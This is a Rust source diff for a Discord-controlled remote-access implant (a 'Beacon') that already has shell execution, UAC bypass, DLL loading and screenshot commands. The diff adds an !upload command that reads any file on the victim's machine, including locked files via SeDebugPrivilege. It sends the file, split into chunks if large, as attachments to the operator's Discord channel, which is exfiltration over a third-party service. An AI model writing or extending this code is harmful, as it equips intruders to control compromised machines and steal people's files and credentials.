@@ -14,6 +14,7 @@ use reqwest::StatusCode;
 use crate::commands::capture_screenshot;
 use crate::commands::{
     execute_kill, execute_shell_command, execute_uac_bypass, get_help_message, load_dll_from_bytes,
+    read_file_bytes,
     Command, CommandResult,
 };
 use crate::config::Config;
@@ -44,7 +45,7 @@ pub struct DiscordClient {
 impl DiscordClient {
     /// Create a new Discord client from configuration
     pub fn from_config(config: &Config) -> Result<Self> {
-        let client = Client::builder().timeout(Duration::from_secs(30)).build()?;
+        let client = Client::builder().timeout(Duration::from_secs(300)).build()?;
 
         Ok(Self {
             client,
@@ -402,6 +403,10 @@ impl DiscordClient {
                 self.send_command_result(channel_id, result)?;
                 Ok(true)
             }
+            Command::Upload(path) => {
+                self.handle_upload(channel_id, &path)?;
+                Ok(true)
+            }
             Command::Kill => {
                 // Send confirmation BEFORE killing - FreeLibraryAndExitThread never returns
                 self.send_message(channel_id, "Beacon killed")?;
@@ -463,6 +468,64 @@ impl DiscordClient {
             )),
             Err(e) => CommandResult::Error(format!("PE load failed: {}", e)),
         }
+    }
+
+    /// Handle the !upload command
+    /// Reads a file from disk (even if locked) and sends it as Discord attachment(s)
+    /// Files > 24 MB are split into multiple parts
+    fn handle_upload(&self, channel_id: &str, file_path: &str) -> Result<()> {
+        const CHUNK_SIZE: usize = 7 * 1024 * 1024; // 7 MB par chunk (limite Discord sans Nitro = 8 MB)
+
+        self.send_message(channel_id, &format!("Reading `{}`...", file_path))?;
+
+        // Lire le fichier (avec SeDebugPrivilege + share flags pour les fichiers lockés)
+        let (data, filename) = match read_file_bytes(file_path) {
+            Ok(result) => result,
+            Err(e) => {
+                self.send_message(channel_id, &format!("Error: {}", e))?;
+                return Ok(());
+            }
+        };
+
+        // Si le fichier tient en un seul message
+        if data.len() <= CHUNK_SIZE {
+            match self.send_binary_file(channel_id, &filename, &data, "application/octet-stream") {
+                Ok(_) => {}
+                Err(e) => {
+                    self.send_message(channel_id, &format!("Upload failed: {}", e))?;
+                }
+            }
+            return Ok(());
+        }
+
+        // Sinon, découper en chunks
+        let total_chunks = (data.len() + CHUNK_SIZE - 1) / CHUNK_SIZE;
+        self.send_message(
+            channel_id,
+            &format!(
+                "File `{}` is {} bytes, splitting into {} parts...",
+                filename,
+                data.len(),
+                total_chunks
+            ),
+        )?;
+
+        for (i, chunk) in data.chunks(CHUNK_SIZE).enumerate() {
+            let part_name = format!("{}.part{}", filename, i + 1);
+            match self.send_binary_file(channel_id, &part_name, chunk, "application/octet-stream") {
+                Ok(_) => {}
+                Err(e) => {
+                    self.send_message(
+                        channel_id,
+                        &format!("Failed to upload part {}/{}: {}", i + 1, total_chunks, e),
+                    )?;
+                    return Ok(());
+                }
+            }
+        }
+
+        self.send_message(channel_id, &format!("Upload complete: {} parts sent", total_chunks))?;
+        Ok(())
     }
 }
 
